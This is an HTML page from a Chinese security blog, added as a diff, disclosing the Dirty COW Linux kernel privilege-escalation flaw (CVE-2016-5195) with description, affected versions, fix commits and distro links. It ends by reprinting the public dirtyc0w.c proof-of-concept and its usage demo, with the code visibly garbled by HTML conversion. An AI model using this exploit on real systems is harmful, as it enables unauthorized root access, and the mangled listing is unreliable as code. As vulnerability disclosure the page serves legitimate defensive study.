@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="色魔科技,maniac," />
+
+
+
+
+
+  <link rel="alternate" href="/rss.xml" title="Lost Maniac" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="漏洞描述  漏洞编号：CVE-2016-5195 漏洞名称：脏牛（Dirty COW） 漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权 影响范围：Linux内核&amp;gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 为什么这个漏洞叫脏牛（Dirty">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2016-5195脏牛漏洞：Linux内核通杀提权漏洞（10.21 9:10更新）">
+<meta property="og:url" content="http://maniac.vip/posts/570.html">
+<meta property="og:site_name" content="Lost Maniac">
+<meta property="og:description" content="漏洞描述  漏洞编号：CVE-2016-5195 漏洞名称：脏牛（Dirty COW） 漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权 影响范围：Linux内核&amp;gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 为什么这个漏洞叫脏牛（Dirty COW）漏洞？  Linux内核的内存子系统在处理写时拷贝（Copy-on-Write">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-16T07:57:27.253Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2016-5195脏牛漏洞：Linux内核通杀提权漏洞（10.21 9:10更新）">
+<meta name="twitter:description" content="漏洞描述  漏洞编号：CVE-2016-5195 漏洞名称：脏牛（Dirty COW） 漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权 影响范围：Linux内核&amp;gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 为什么这个漏洞叫脏牛（Dirty COW）漏洞？  Linux内核的内存子系统在处理写时拷贝（Copy-on-Write">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://maniac.vip/posts/570.html"/>
+
+
+
+
+
+  <title>CVE-2016-5195脏牛漏洞：Linux内核通杀提权漏洞（10.21 9:10更新） | Lost Maniac</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?6ece9853dbf154aa223dfef063628fe2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lost Maniac</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人若无名便可专心练贱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maniac.vip/posts/570.html?day=20171116">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lost Maniac">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lost Maniac">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CVE-2016-5195脏牛漏洞：Linux内核通杀提权漏洞（10.21 9:10更新）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-10-21T11:42:14+08:00">
+                2016-10-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/本地提权/" itemprop="url" rel="index">
+                    <span itemprop="name">本地提权</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/本地提权/漏洞披露/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞披露</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/posts/570.html?day=20171116#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/570.html?day=20171116" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>漏洞描述</strong></p>
+<hr>
+<p>漏洞编号：CVE-2016-5195</p>
+<p>漏洞名称：脏牛（Dirty COW）</p>
+<p>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权</p>
+<p>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
+<p><strong>为什么这个漏洞叫脏牛（Dirty COW）漏洞？</strong></p>
+<hr>
+<p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。</p>
+<p><strong>漏洞相关细节</strong></p>
+<hr>
+<p>漏洞细节：<a href="https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</a></p>
+<p>根据RedHat公司的报告称：目前已经在野外发现针对这个漏洞的利用技术。但是到目前为止，我们没有更进一步的消息。</p>
+<p><a href="https://access.redhat.com/security/vulnerabilities/2706661" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/2706661</a></p>
+<p>Commit messages：</p>
+<p>commit 4ceb5db9757aaeadcf8fbbf97d76bd42aa4df0d6</p>
+<p>Author: Linus Torvalds &lt;torvalds@g5.osdl.org&gt;</p>
+<p>Date:   Mon Aug 1 11:14:49 2005 -0700</p>
+<p>修复get_user_pages()写访问竞争条件</p>
+<p>如果一个更新来自其他线程结束修改页表，handle_mm_fault()将可能结束需要我们重新操作。handle_mm_fault()没有真正的防护一直能够破坏COW。这样看起来是不错的，但是get_user_pages()结束后会重新读，使get_user_pages()一直重写的话，需要dirty bit 设置，最简单的解决竞争条件的办法是，如果COW的break因为某些原因失败，我们能够继续循环继续尝试。</p>
+<p>commit 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</p>
+<p>Author: Linus Torvalds &lt;torvalds@linux-foundation.org&gt;</p>
+<p>Date:   Thu Oct 13 20:07:36 2016 GMT</p>
+<p>这是一个年代久远的BUG了，我在7年前已经曾经尝试修复过一次了（commit 4ceb5db9757a），但是由于一些问题（commit f33ea7f404e5）又回滚了。这次，我们对pte_dirty()位做了检测。</p>
+<p><strong>Linux各发行版本对于该漏洞相关信息</strong></p>
+<hr>
+<p>Red Hat：<a href="https://access.redhat.com/security/cve/cve-2016-5195" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2016-5195</a></p>
+<p>Debian ：<a href="https://security-tracker.debian.org/tracker/CVE-2016-5195" target="_blank" rel="noopener">https://security-tracker.debian.org/tracker/CVE-2016-5195</a></p>
+<p>Ubuntu ：<a href="http://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-5195.html" target="_blank" rel="noopener">http://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-5195.html</a></p>
+<p><strong>受影响的范围</strong></p>
+<hr>
+<p>这个漏洞自从内核2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
+<p><strong>如何修复该漏洞？**</strong><br>**</p>
+<hr>
+<p>Linux团队正在积极的修复此漏洞，可以通过系统更新到最新发行版修复此漏洞。软件开发人员也可以通过</p>
+<p><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619" target="_blank" rel="noopener">https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/？id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</a></p>
+<p>重新编译Linux修复此漏洞。</p>
+<p><strong>如何发现有人利用该漏洞攻击我？</strong></p>
+<hr>
+<p>利用这个Bug不会在日志里留下异常信息。但是部分安全社区已经部署蜜罐，如果有攻击者利用此漏洞，将会触发告警。</p>
+<p><strong>谁发现的这个漏洞？</strong></p>
+<hr>
+<p>Phil Oester （<a href="https://access.redhat.com/security/cve/CVE-2016-5195" target="_blank" rel="noopener">https://access.redhat.com/security/cve/CVE-2016-5195</a>）</p>
+<p><strong>对于该漏洞作者甚至申请了独立的：</strong>网站、twitter帐号、github帐号、并找专人设计了Logo</p>
+<p>作者对此的解释是：我们对建立有品牌的漏洞充满了乐趣，但是也许在这个时间点，这不是一个好主意。但是为了表明我们的立场，我才创建了网站，在线商店，twiiter帐号，以及请专业设计师为这个漏洞设计了LOGO。</p>
+<p>POC地址：</p>
+<p><a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a></p>
+<p>&nbsp;</p>
+<p>/*</p>
+<p>####################### dirtyc0w.c #######################<br>$ sudo -s</p>
+<h1 id="echo-this-is-not-a-test-gt-foo"><a href="#echo-this-is-not-a-test-gt-foo" class="headerlink" title="echo this is not a test &gt; foo"></a>echo this is not a test &gt; foo</h1><h1 id="chmod-0404-foo"><a href="#chmod-0404-foo" class="headerlink" title="chmod 0404 foo"></a>chmod 0404 foo</h1><p>$ ls -lah foo<br>-r—–r– 1 root root 19 Oct 20 15:23 foo<br>$ cat foo<br>this is not a test<br>$ gcc -lpthread dirtyc0w.c -o dirtyc0w<br>$ ./dirtyc0w foo m00000000000000000<br>mmap 56123000<br>madvise 0<br>procselfmem 1800000000<br>$ cat foo<br>m00000000000000000</p>
+<p>####################### dirtyc0w.c #######################<br>*/</p>
+<p>#include</p>
+<p>#include &lt;sys/mman.h&gt;</p>
+<p>#include</p>
+<p>#include #include</p>
+<p>void <em>map;<br>int f;<br>struct stat st;<br>char </em>name;</p>
+<p>void <em>madviseThread(void </em>arg)<br>{<br>char <em>str;<br>str=(char</em>)arg;<br>int i,c=0;<br>for(i=0;i&lt;100000000;i++) { /<em> You have to race madvise(MADV_DONTNEED) :: <a href="https://access.redhat.com/security/vulnerabilities/2706661" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/2706661</a> &gt; This is achieved by racing the madvise(MADV_DONTNEED) system call<br>&gt; while having the page of the executable mmapped in memory.
+</em>/<br>c+=madvise(map,100,MADV_DONTNEED);<br>}<br>printf(“madvise %d\n\n”,c);<br>}</p>
+<p>void <em>procselfmemThread(void </em>arg)<br>{<br>char <em>str;<br>str=(char</em>)arg;<br>/<em><br>You have to write to /proc/self/mem :: <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16" target="_blank" rel="noopener">https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</a><br>&gt; The in the wild exploit we are aware of doesn’t work on Red Hat<br>&gt; Enterprise Linux 5 and 6 out of the box because on one side of<br>&gt; the race it writes to /proc/self/mem, but /proc/self/mem is not<br>&gt; writable on Red Hat Enterprise Linux 5 and 6.
+</em>/<br>int f=open(“/proc/self/mem”,O_RDWR);<br>int i,c=0;<br>for(i=0;i&lt;100000000;i++) {<br>/<em><br>You have to reset the file pointer to the memory position.
+</em>/<br>lseek(f,map,SEEK_SET);<br>c+=write(f,str,strlen(str));<br>}<br>printf(“procselfmem %d\n\n”, c);<br>}</p>
+<p>int main(int argc,char <em>argv[])<br>{<br>/</em><br>You have to pass two arguments. File and Contents.<br><em>/<br>if (argc&lt;3)return 1; pthread_t pth1,pth2; /</em> You have to open the file in read only mode. <em>/ f=open(argv[1],O_RDONLY); fstat(f,&amp;st); name=argv[1]; /</em> You have to use MAP_PRIVATE for copy-on-write mapping. &gt; Create a private copy-on-write mapping. Updates to the<br>&gt; mapping are not visible to other processes mapping the same<br>&gt; file, and are not carried through to the underlying file. It<br>&gt; is unspecified whether changes made to the file after the<br>&gt; mmap() call are visible in the mapped region.<br><em>/<br>/</em><br>You have to open with PROT_READ.<br><em>/<br>map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);<br>printf(“mmap %x\n\n”,map);<br>/</em><br>You have to do it on two threads.<br><em>/<br>pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);<br>pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);<br>/</em><br>You have to wait for the threads to finish.<br>*/<br>pthread_join(pth1,NULL);<br>pthread_join(pth2,NULL);<br>return 0;<br>}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/568.html?day=20171116" rel="next" title="常用安全工具集锦">
+                <i class="fa fa-chevron-left"></i> 常用安全工具集锦
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/573.html?day=20171116" rel="prev" title="查询BGP线路方法">
+                查询BGP线路方法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Lost Maniac" />
+            
+              <p class="site-author-name" itemprop="name">Lost Maniac</p>
+              <p class="site-description motion-element" itemprop="description">随便写写</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/rss.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/MSG-maniac" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:semowansui@vip.qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://qs5.org/" title="青石坞" target="_blank">青石坞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bejson.com/" title="bejson" target="_blank">bejson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hellojava.com/" title="HelloJava" target="_blank">HelloJava</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#echo-this-is-not-a-test-gt-foo"><span class="nav-number">1.</span> <span class="nav-text">echo this is not a test > foo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#chmod-0404-foo"><span class="nav-number">2.</span> <span class="nav-text">chmod 0404 foo</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2013 &mdash; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">色魔科技</span>
+
+  
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytjBrzIY';
+      var conf = 'e3ae49b68dbe1a48b4fee1de4e87cc06';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
